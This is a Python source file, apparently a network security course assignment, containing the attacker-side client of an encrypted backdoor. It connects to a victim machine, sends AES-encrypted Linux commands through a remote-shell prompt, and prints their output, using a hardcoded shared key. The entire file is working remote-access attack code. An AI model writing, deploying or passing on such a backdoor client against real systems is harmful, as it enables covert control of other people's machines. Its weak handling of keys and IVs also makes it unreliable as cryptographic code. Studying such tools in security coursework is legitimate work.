#!/usr/bin/python
'''
COMP 8505 - Assignment 3
Backdoor - Client (Attacker) by Jeffrey Sasaki

The client program will allow remote access to the victim's machine, allowing
the user to execute linux commands on the victims machine.

The program will output the executed command given by the victim.
'''

from Crypto.Cipher import AES
from Crypto import Random
import socket
import base64
import os
import optparse
import sys

# encrypt/encode and decrypt/decode a string
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# random secret key (both the client and server must match this key)
secret = "sixteen byte key"
iv = Random.new().read(AES.block_size)
cipher = AES.new(secret, AES.MODE_CFB, iv)

# parse command line argument
parser = optparse.OptionParser("usage: python client.py -d <host ip> -p <port>")
parser.add_option('-d', dest='host', type = 'string', help = 'target host IP')
parser.add_option('-p', dest='port', type = 'int', help = 'target port')
(options, args) = parser.parse_args()
if (options.host == None):
    print parser.usage
    sys.exit()
elif (options.port == None):
    print parser.usage
    sys.exit()
else:
    host = options.host
    port = options.port

# connect to the server host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# main
while True:
    data = s.recv(1024)

    # decrypt data
    decrypted = DecodeAES(cipher, data)

    # check for end of file
    if decrypted.endswith(secret) == True:

        # print command
        print decrypted[:-16]

        # get command
        cmd = raw_input("[remote shell]$ ")

        # encrypt command
        encrypted = EncodeAES(cipher, cmd)

        # send encrypted command
        s.send(encrypted)
        
        # check if user typed "exit" to leave remote shell
        if cmd == "exit":
            break
    else:
        print decrypted
s.close()
sys.exit()
